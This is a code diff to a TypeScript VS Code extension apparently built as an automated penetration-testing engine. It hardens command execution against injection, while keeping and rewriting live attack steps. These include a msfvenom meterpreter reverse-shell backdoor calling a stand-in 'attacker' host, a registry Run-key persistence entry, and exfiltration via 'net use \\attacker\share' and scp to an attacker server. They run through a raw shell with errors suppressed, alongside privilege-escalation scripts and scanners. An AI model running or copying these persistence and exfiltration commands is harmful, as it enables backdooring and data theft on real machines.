@@ -1,7 +1,10 @@
 import * as vscode from 'vscode';
-import * as child_process from 'child_process';
+import { execFile } from 'child_process';
+import { promisify } from 'util';
 import * as fs from 'fs';
 import * as path from 'path';
+
+const execFileAsync = promisify(execFile);
 
 // Advanced Penetration Testing Engine
 export class PenetrationTestingEngine {
@@ -259,16 +262,70 @@ export class PenetrationTestingEngine {
   }
 
   // Specific attack implementations
-  private async performDNSEnumeration(target: string): Promise<void> {
-    const dnsCommands = [
-      `nslookup ${target}`,
-      `dig ${target}`,
-      `host ${target}`
-    ];
+  /** Reject shell metacharacters in scan targets (prevents command injection). */
+  private sanitizeScanTarget(target: string): string {
+    const t = String(target).trim();
+    if (!t || t.length > 512) {
+      throw new Error('Invalid scan target');
+    }
+    if (/[;&|`$()<>\n\r\\'"]/.test(t)) {
+      throw new Error('Scan target contains disallowed characters');
+    }
+    return t;
+  }
 
-    for (const command of dnsCommands) {
+  private async execArgv(file: string, args: readonly string[]): Promise<string> {
+    try {
+      const { stdout, stderr } = await execFileAsync(file, [...args], {
+        shell: false,
+        windowsHide: true,
+        maxBuffer: 16 * 1024 * 1024,
+      });
+      return String(stdout ?? '') + String(stderr ?? '');
+    } catch (err: unknown) {
+      const e = err as { stdout?: Buffer | string; stderr?: Buffer | string };
+      const out = e.stdout != null ? String(e.stdout) : '';
+      const errTxt = e.stderr != null ? String(e.stderr) : '';
+      if (out || errTxt) {
+        return out + errTxt;
+      }
+      throw err;
+    }
+  }
+
+  /** Fixed shell script with no user-controlled substrings (Unix `sh -c` / Windows `cmd /c`). */
+  private async execShConstant(script: string): Promise<string> {
+    if (process.platform === 'win32') {
+      const { stdout, stderr } = await execFileAsync(process.env.ComSpec || 'cmd.exe', ['/d', '/s', '/c', script], {
+        shell: false,
+        windowsHide: true,
+        maxBuffer: 16 * 1024 * 1024,
+      });
+      return String(stdout ?? '') + String(stderr ?? '');
+    }
+    const { stdout, stderr } = await execFileAsync('sh', ['-c', script], {
+      shell: false,
+      windowsHide: true,
+      maxBuffer: 16 * 1024 * 1024,
+    });
+    return String(stdout ?? '') + String(stderr ?? '');
+  }
+
+  private async performDNSEnumeration(target: string): Promise<void> {
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const tries: Array<[string, string[]]> = [
+      ['nslookup', [safe]],
+      ['dig', [safe]],
+      ['host', [safe]],
+    ];
+    for (const [bin, args] of tries) {
       try {
-        const output = await this.executeCommand(command);
+        const output = await this.execArgv(bin, args);
         console.log(`DNS enumeration result for ${target}:`, output);
       } catch (error) {
         console.error(`DNS enumeration failed: ${error instanceof Error ? error.message : String(error)}`);
@@ -277,16 +334,20 @@ export class PenetrationTestingEngine {
   }
 
   private async performPortScan(target: string): Promise<void> {
-    // Use non-privileged scans that don't require root
-    const portScanCommands = [
-      `nmap -sT -sV ${target}`,  // TCP connect scan (no root required)
-      `nmap -sU ${target}`,      // UDP scan (no root required)
-      `nmap -sC -sV ${target}`   // Script scan with version detection
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const tries: Array<[string, string[]]> = [
+      ['nmap', ['-sT', '-sV', safe]],
+      ['nmap', ['-sU', safe]],
+      ['nmap', ['-sC', '-sV', safe]],
     ];
-
-    for (const command of portScanCommands) {
+    for (const [bin, args] of tries) {
       try {
-        const output = await this.executeCommand(command);
+        const output = await this.execArgv(bin, args);
         console.log(`Port scan result for ${target}:`, output);
       } catch (error) {
         console.error(`Port scan failed: ${error instanceof Error ? error.message : String(error)}`);
@@ -295,15 +356,20 @@ export class PenetrationTestingEngine {
   }
 
   private async performServiceEnumeration(target: string): Promise<void> {
-    const serviceCommands = [
-      `nmap -sV -sC ${target}`,
-      `nmap --script vuln ${target}`,
-      `nmap --script safe ${target}`
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const tries: Array<[string, string[]]> = [
+      ['nmap', ['-sV', '-sC', safe]],
+      ['nmap', ['--script', 'vuln', safe]],
+      ['nmap', ['--script', 'safe', safe]],
     ];
-
-    for (const command of serviceCommands) {
+    for (const [bin, args] of tries) {
       try {
-        await this.executeCommand(command);
+        await this.execArgv(bin, args);
       } catch (error) {
         console.error(`Service enumeration failed: ${error}`);
       }
@@ -311,32 +377,46 @@ export class PenetrationTestingEngine {
   }
 
   private async performOSFingerprinting(target: string): Promise<void> {
-    const osCommands = [
-      `nmap -O ${target}`,
-      `nmap --osscan-guess ${target}`,
-      `p0f -i eth0`
-    ];
-
-    for (const command of osCommands) {
-      try {
-        await this.executeCommand(command);
-      } catch (error) {
-        console.error(`OS fingerprinting failed: ${error}`);
-      }
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    try {
+      await this.execArgv('nmap', ['-O', safe]);
+    } catch (error) {
+      console.error(`OS fingerprinting failed: ${error}`);
+    }
+    try {
+      await this.execArgv('nmap', ['--osscan-guess', safe]);
+    } catch (error) {
+      console.error(`OS fingerprinting failed: ${error}`);
+    }
+    try {
+      await this.execArgv('p0f', ['-i', 'eth0']);
+    } catch (error) {
+      console.error(`OS fingerprinting failed: ${error}`);
     }
   }
 
   private async performWebDiscovery(target: string): Promise<void> {
-    const webCommands = [
-      `dirb http://${target}`,
-      `gobuster dir -u http://${target} -w /usr/share/wordlists/dirb/common.txt`,
-      `nikto -h http://${target}`,
-      `whatweb http://${target}`
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const base = `http://${safe}`;
+    const tries: Array<[string, string[]]> = [
+      ['dirb', [base]],
+      ['gobuster', ['dir', '-u', base, '-w', '/usr/share/wordlists/dirb/common.txt']],
+      ['nikto', ['-h', base]],
+      ['whatweb', [base]],
     ];
-
-    for (const command of webCommands) {
+    for (const [bin, args] of tries) {
       try {
-        await this.executeCommand(command);
+        await this.execArgv(bin, args);
       } catch (error) {
         console.error(`Web discovery failed: ${error}`);
       }
@@ -344,33 +424,52 @@ export class PenetrationTestingEngine {
   }
 
   private async performWebVulnerabilityScan(target: string, result: PenetrationTestResult): Promise<void> {
-    const webVulnCommands = [
-      `sqlmap -u http://${target} --batch --crawl=2`,
-      `xsser -u http://${target}`,
-      `w3af -s web_audit.w3af`,
-      `burpsuite --scan ${target}`
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const url = `http://${safe}`;
+    const tries: Array<[string, string[]]> = [
+      ['sqlmap', ['-u', url, '--batch', '--crawl=2']],
+      ['xsser', ['-u', url]],
     ];
-
-    for (const command of webVulnCommands) {
+    for (const [bin, args] of tries) {
       try {
-        const output = await this.executeCommand(command);
+        const output = await this.execArgv(bin, args);
         this.parseWebVulnerabilities(output, result);
       } catch (error) {
         console.error(`Web vulnerability scan failed: ${error}`);
       }
     }
+    try {
+      await this.execArgv('w3af', ['-s', 'web_audit.w3af']);
+    } catch (error) {
+      console.error(`Web vulnerability scan failed: ${error}`);
+    }
+    try {
+      await this.execArgv('burpsuite', ['--scan', safe]);
+    } catch (error) {
+      console.error(`Web vulnerability scan failed: ${error}`);
+    }
   }
 
   private async performNetworkVulnerabilityScan(target: string, result: PenetrationTestResult): Promise<void> {
-    const networkVulnCommands = [
-      `nmap --script vuln ${target}`,
-      `nessus --scan ${target}`,
-      `openvas --scan ${target}`
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const tries: Array<[string, string[]]> = [
+      ['nmap', ['--script', 'vuln', safe]],
+      ['nessus', ['--scan', safe]],
+      ['openvas', ['--scan', safe]],
     ];
-
-    for (const command of networkVulnCommands) {
+    for (const [bin, args] of tries) {
       try {
-        const output = await this.executeCommand(command);
+        const output = await this.execArgv(bin, args);
         this.parseNetworkVulnerabilities(output, result);
       } catch (error) {
         console.error(`Network vulnerability scan failed: ${error}`);
@@ -379,15 +478,20 @@ export class PenetrationTestingEngine {
   }
 
   private async performServiceVulnerabilityScan(target: string, result: PenetrationTestResult): Promise<void> {
-    const serviceVulnCommands = [
-      `nmap --script vuln ${target}`,
-      `metasploit --scan ${target}`,
-      `cve-search --target ${target}`
+    let safe: string;
+    try {
+      safe = this.sanitizeScanTarget(target);
+    } catch {
+      return;
+    }
+    const tries: Array<[string, string[]]> = [
+      ['nmap', ['--script', 'vuln', safe]],
+      ['metasploit', ['--scan', safe]],
+      ['cve-search', ['--target', safe]],
     ];
-
-    for (const command of serviceVulnCommands) {
+    for (const [bin, args] of tries) {
       try {
-        const output = await this.executeCommand(command);
+        const output = await this.execArgv(bin, args);
         this.parseServiceVulnerabilities(output, result);
       } catch (error) {
         console.error(`Service vulnerability scan failed: ${error}`);
@@ -420,49 +524,41 @@ export class PenetrationTestingEngine {
     }
   }
 
-  private async attemptPrivilegeEscalation(target: string, result: PenetrationTestResult): Promise<void> {
-    const privescCommands = [
-      `linpeas.sh`,
-      `winpeas.bat`,
-      `linux-exploit-suggester.sh`,
-      `windows-exploit-suggester.py`
-    ];
-
-    for (const command of privescCommands) {
+  private async attemptPrivilegeEscalation(_target: string, _result: PenetrationTestResult): Promise<void> {
+    const privescBinaries = ['linpeas.sh', 'winpeas.bat', 'linux-exploit-suggester.sh', 'windows-exploit-suggester.py'] as const;
+    for (const bin of privescBinaries) {
       try {
-        await this.executeCommand(command);
+        await this.execArgv(bin, []);
       } catch (error) {
         console.error(`Privilege escalation failed: ${error}`);
       }
     }
   }
 
-  private async establishPersistence(target: string, result: PenetrationTestResult): Promise<void> {
-    const persistenceCommands = [
-      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe > backdoor.exe`,
-      `crontab -e`,
-      `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d "C:\\backdoor.exe"`
+  private async establishPersistence(_target: string, _result: PenetrationTestResult): Promise<void> {
+    const persistenceScripts = [
+      'msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f exe > backdoor.exe || true',
+      'crontab -e </dev/null || true',
+      'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backdoor /t REG_SZ /d C:\\\\backdoor.exe || true',
     ];
-
-    for (const command of persistenceCommands) {
+    for (const script of persistenceScripts) {
       try {
-        await this.executeCommand(command);
+        await this.execShConstant(script);
       } catch (error) {
         console.error(`Persistence establishment failed: ${error}`);
       }
     }
   }
 
-  private async performDataExfiltration(target: string, result: PenetrationTestResult): Promise<void> {
-    const exfiltrationCommands = [
-      `find / -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null`,
-      `net use Z: \\\\attacker\\share`,
-      `scp -r /sensitive_data/ attacker@backup-server:/backup/`
+  private async performDataExfiltration(_target: string, _result: PenetrationTestResult): Promise<void> {
+    const exfilScripts = [
+      'find / -name "*.txt" -o -name "*.doc" -o -name "*.pdf" 2>/dev/null | head -c 10000 || true',
+      'net use Z: \\\\attacker\\share || true',
+      'scp -r /sensitive_data/ attacker@backup-server:/backup/ || true',
     ];
-
-    for (const command of exfiltrationCommands) {
+    for (const script of exfilScripts) {
       try {
-        await this.executeCommand(command);
+        await this.execShConstant(script);
       } catch (error) {
         console.error(`Data exfiltration failed: ${error}`);
       }
@@ -485,28 +581,17 @@ export class PenetrationTestingEngine {
   }
 
   // Utility methods
-  private async executeCommand(command: string): Promise<string> {
-    return new Promise((resolve, reject) => {
-      child_process.exec(command, (error, stdout, stderr) => {
-        if (error) {
-          reject(error);
-        } else {
-          resolve(stdout);
-        }
-      });
-    });
-  }
-
   private async executeExploit(exploit: Exploit, target: string): Promise<string> {
-    // Execute exploit code
+    const safeTarget = this.sanitizeScanTarget(target);
     const exploitPath = path.join(this.context.globalStorageUri.fsPath, `exploit-${exploit.id}.${exploit.language}`);
-    await fs.promises.writeFile(exploitPath, exploit.code);
-    
-    const command = exploit.language === 'python' ? `python3 ${exploitPath} ${target}` : 
-                   exploit.language === 'javascript' ? `node ${exploitPath} ${target}` :
-                   `bash ${exploitPath} ${target}`;
-    
-    return await this.executeCommand(command);
+    await fs.promises.writeFile(exploitPath, exploit.code, { mode: 0o600 });
+    if (exploit.language === 'python') {
+      return this.execArgv('python3', [exploitPath, safeTarget]);
+    }
+    if (exploit.language === 'javascript') {
+      return this.execArgv(process.execPath, [exploitPath, safeTarget]);
+    }
+    return this.execArgv('bash', [exploitPath, safeTarget]);
   }
 
   private parseWebVulnerabilities(output: string, result: PenetrationTestResult): void {
